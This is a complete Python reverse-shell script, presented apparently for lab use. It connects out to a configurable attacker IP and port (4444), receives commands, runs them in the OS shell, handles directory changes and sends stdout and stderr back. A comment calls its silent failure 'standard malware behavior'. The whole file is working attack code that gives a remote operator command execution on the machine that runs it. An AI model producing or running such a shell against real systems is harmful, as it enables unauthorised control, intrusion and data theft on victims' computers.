import socket
import subprocess
import os

# CONFIGURATION
ATTACKER_IP = "127.0.0.1" # Localhost for testing. Change this to your IP in a lab.
ATTACKER_PORT = 4444

def connect_to_attacker():
    try:
        # 1. Connect to the listener
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        
        # 2. Loop to receive commands
        while True:
            command = s.recv(1024).decode()
            
            if 'exit' in command:
                break
            
            # Handle 'cd' command (Change Directory) manually
            # because subprocess runs in a separate thread and doesn't change shell state
            if command.startswith('cd '):
                try:
                    os.chdir(command[3:])
                    s.send(b"Changed Directory")
                except Exception as e:
                    s.send(str(e).encode())
                continue
            
            # 3. Execute the command
            # subprocess.run executes the command in the OS shell
            proc = subprocess.run(command, shell=True, capture_output=True)
            
            # 4. Send output back to attacker
            # We send both stdout (success) and stderr (errors)
            output = proc.stdout + proc.stderr
            s.send(output)
            
        s.close()
    except Exception as e:
        # Silently fail if connection drops (standard malware behavior)
        pass

if __name__ == "__main__":
    connect_to_attacker()